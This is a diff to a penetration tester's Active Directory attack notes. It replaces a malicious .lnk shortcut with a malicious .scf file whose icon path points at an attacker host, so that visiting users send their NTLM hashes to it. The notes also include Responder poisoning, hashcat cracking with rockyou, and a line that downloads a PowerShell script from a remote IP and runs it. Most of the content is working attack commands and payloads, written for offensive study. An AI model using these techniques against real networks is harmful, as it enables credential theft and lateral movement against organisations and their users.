@@ -24,14 +24,9 @@ IEX (iwr 'http://10.10.10.205/procmon.ps1')
 ### [LLMNR-NBTNS-mDNS Poisining](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)
 
 
-# Capturing Hashes with a Malicious .lnk File
+# Capturing Hashes with a Malicious .scf File
 ```powershell
 sudo responder -I eth0 -dwv
-Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -Inspect Y
-
-For Example:
-[+] [2026-05-27T06:33:02] LLMNR request for GS-SVCSCAN received from 10.129.205.45 [inspect only]
-[+] [2026-05-27T06:33:10] LLMNR request for GS-SVCSCAN received from 10.129.205.45 [inspect only]
 
 PS C:\Tools> net share
 Share name   Resource                        Remark
@@ -41,12 +36,12 @@ IPC$                                         Remote IPC
 ADMIN$       C:\Windows                      Remote Admin
 Department Shares  C:\Department Shares
 
-GS-SVCSCAN.lnk:
-$objShell = New-Object -ComObject WScript.Shell
-$lnk = $objShell.CreateShortcut("C:\Department Shares\GS-SVCSCAN.lnk")
-$lnk.TargetPath = "\\172.16.20.45\share\icon.png"
-$lnk.IconLocation = "%windir%\system32\shell32.dll, 4"
-$lnk.Save()
+@Inventory.scf:
+[Shell]
+Command=2
+IconFile=\\\\<ATTACKER_IP>@<PORT>\\share\\legit.ico
+[Taskbar]
+Command=ToggleDesktop
 
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
